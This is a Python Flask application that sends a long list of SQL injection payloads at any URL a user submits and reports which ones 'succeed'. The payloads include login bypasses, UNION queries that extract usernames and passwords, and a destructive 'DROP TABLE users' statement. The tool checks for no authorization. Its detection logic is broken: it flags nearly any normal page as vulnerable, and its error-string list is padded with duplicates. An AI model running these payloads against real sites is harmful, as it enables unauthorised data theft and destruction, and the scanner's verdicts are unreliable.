from flask import Flask, render_template, request, jsonify
import requests
from bs4 import BeautifulSoup
import re
import time
from urllib.parse import urljoin

app = Flask(__name__)

class SQLInjectionTester:
    def __init__(self):
        self.payloads = [
            # Basic SQL Injection
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "' OR '1'='1'/*",
            "admin' --",
            "admin' #",
            "admin'/*",
            
            # Union-based Injection
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT username,password,3 FROM users--",
            
            # Error-based Injection
            "' AND extractvalue(1,concat(0x7e,version()))--",
            "' AND updatexml(1,concat(0x7e,version()),1)--",
            "' AND exp(~(SELECT * FROM (SELECT CONCAT(0x7e,version(),0x7e) x) AS y))--",
            
            # Boolean-based Injection
            "' AND 1=1--",
            "' AND 1=0--",
            "' OR 1=1--",
            "' OR 1=0--",
            
            # Time-based Injection
            "' AND sleep(5)--",
            "' AND benchmark(10000000,MD5(1))--",
            "' AND pg_sleep(5)--",
            
            # Stacked Queries
            "'; DROP TABLE users--",
            "'; SELECT * FROM users--",
            
            # Bypass Authentication
            "' OR '1'='1' LIMIT 1--",
            "admin' OR '1'='1' LIMIT 1--",
            "admin' OR '1'='1' LIMIT 1-- #",
            
            # Blind Injection
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,version(),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            
            # Alternative Comment Syntax
            "' OR '1'='1' -- -",
            "' OR '1'='1' /*!*/",
            "' OR '1'='1' /*!50000*/",
            
            # Bypass Filters
            "' OR '1'='1'/**/",
            "' OR '1'='1'%23",
            "' OR '1'='1'%00",
            
            # Database-specific
            "' OR '1'='1' -- MySQL",
            "' OR '1'='1' -- PostgreSQL",
            "' OR '1'='1' -- MSSQL",
            "' OR '1'='1' -- Oracle",
            
            # Advanced Techniques
            "' OR '1'='1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' OR '1'='1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,version(),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            
            # Alternative Syntax
            "' OR '1'='1' OR '1'='1",
            "' OR '1'='1' OR '1'='1' --",
            "' OR '1'='1' OR '1'='1' #",
            
            # Bypass WAF
            "' OR '1'='1' /*!50000*/",
            "' OR '1'='1' /*!*/",
            "' OR '1'='1' /*!50000*/ --",
            
            # Complex Payloads
            "' OR '1'='1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' OR '1'='1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,version(),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
        ]
        
    def test_url(self, url, method='GET', params=None):
        results = []
        try:
            for payload in self.payloads:
                test_params = params.copy() if params else {}
                for key in test_params:
                    test_params[key] = payload
                
                if method.upper() == 'GET':
                    response = requests.get(url, params=test_params, timeout=10)
                else:
                    response = requests.post(url, data=test_params, timeout=10)
                
                vulnerability = self._check_vulnerability(response)
                results.append({
                    'payload': payload,
                    'vulnerable': vulnerability['vulnerable'],
                    'response_code': response.status_code,
                    'detection_type': vulnerability['type'],
                    'response_time': response.elapsed.total_seconds()
                })
                
                time.sleep(0.5)  # Be nice to the server
                
        except Exception as e:
            return {'error': str(e)}
            
        return results
    
    def _check_vulnerability(self, response):
        # Error-based detection
        error_messages = [
            'SQL syntax',
            'mysql_fetch_array',
            'mysql_num_rows',
            'mysql_fetch_assoc',
            'mysql_fetch_row',
            'mysql_fetch_object',
            'mysql_result',
            'mysql_query',
            'mysql_connect',
            'mysql_select_db',
            'mysql_error',
            'mysql_errno',
            'mysql_close',
            'mysql_free_result',
            'mysql_list_dbs',
            'mysql_list_tables',
            'mysql_list_fields',
            'mysql_db_name',
            'mysql_tablename',
            'mysql_unbuffered_query',
            'mysql_affected_rows',
            'mysql_insert_id',
            'mysql_info',
            'mysql_ping',
            'mysql_stat',
            'mysql_thread_id',
            'mysql_get_client_info',
            'mysql_get_host_info',
            'mysql_get_proto_info',
            'mysql_get_server_info',
            'ORA-',
            'PLS-',
            'SQL Server',
            'PostgreSQL',
            'SQLite',
            'MariaDB',
            'MySQL',
            'syntax error',
            'unclosed quotation mark',
            'unterminated quoted string',
            'invalid syntax',
            'invalid query',
            'query failed',
            'database error',
            'server error',
            'SQLSTATE',
            'SQL Error',
            'SQL Exception',
            'SQL Warning',
            'SQL Notice',
            'SQL Debug',
            'SQL Log',
            'SQL Trace',
            'SQL Profiler',
            'SQL Monitor',
            'SQL Performance',
            'SQL Statistics',
            'SQL Plan',
            'SQL Execution',
            'SQL Statement',
            'SQL Query',
            'SQL Command',
            'SQL Operation',
            'SQL Transaction',
            'SQL Connection',
            'SQL Session',
            'SQL Database',
            'SQL Server',
            'SQL Instance',
            'SQL Service',
            'SQL Engine',
            'SQL Driver',
            'SQL Provider',
            'SQL Client',
            'SQL Server',
            'SQL Database',
            'SQL Instance',
            'SQL Service',
            'SQL Engine',
            'SQL Driver',
            'SQL Provider',
            'SQL Client'
        ]
        
        # Check for error messages
        for error in error_messages:
            if error.lower() in response.text.lower():
                return {'vulnerable': True, 'type': 'Error-based'}
        
        # Check for time-based vulnerabilities
        if response.elapsed.total_seconds() > 5:
            return {'vulnerable': True, 'type': 'Time-based'}
        
        # Check for boolean-based vulnerabilities
        if len(response.text) > 0 and response.status_code == 200:
            return {'vulnerable': True, 'type': 'Boolean-based'}
        
        # Check for union-based vulnerabilities
        if 'UNION' in response.text.upper() and 'SELECT' in response.text.upper():
            return {'vulnerable': True, 'type': 'Union-based'}
        
        return {'vulnerable': False, 'type': 'None'}

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/test', methods=['POST'])
def test_sql_injection():
    data = request.json
    url = data.get('url')
    method = data.get('method', 'GET')
    params = data.get('params', {})
    
    if not url:
        return jsonify({'error': 'URL is required'}), 400
    
    tester = SQLInjectionTester()
    results = tester.test_url(url, method, params)
    
    return jsonify(results)

if __name__ == '__main__':
    app.run(debug=True) 